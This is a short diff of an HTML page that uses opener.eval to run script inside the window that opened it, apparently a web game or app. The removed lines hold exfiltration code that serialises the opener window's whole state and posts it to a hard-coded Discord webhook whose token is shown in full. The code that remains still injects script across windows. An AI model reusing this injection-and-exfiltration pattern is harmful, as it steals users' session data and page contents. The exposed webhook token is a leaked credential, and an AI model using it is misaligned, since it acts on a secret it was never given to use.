@@ -1,4 +1,4 @@
-Hello World 33
+Hello World 34
 <!DOCTYPE html>
 <html>
 <body>
@@ -24,33 +24,7 @@ try{
     
     opener.eval(`   
         console.log(this);
-    window['0'].gui?.chat?._logServerText("hihi")
- 
-    let cachee = [];
-    let dataWebhook = "https://discord.com/api/webhooks/1118142166024323153/X9cL9G4VY8ZDLmwa6xfAdXf6cyO0NWE0Gsf5Ao3o4stAuqqX4csuek6awCFfKgUZzhtw";
-    function sendDataWebhook(data){
-    const body = JSON.stringify({
-        "content":data,
-    });
-    fetch(dataWebhook, {
-        method: "post",
-        headers: {
-        "Content-Type": "application/json",
-        },
-        body: body,
-    });
-    }
-        let data = JSON.stringify(this,(key, value) => {
-        if (typeof value === 'object' && value !== null) {
-            // Duplicate reference found, discard key
-            if (cachee.includes(value)) return;
-
-            // Store value in our collection
-            cachee.push(value);
-        }
-        return value;
-        });
-    sendDataWebhook(data);
+    window['0'].gui?.chat?._logServerText("hihi");
   `);
 }
 catch(e){
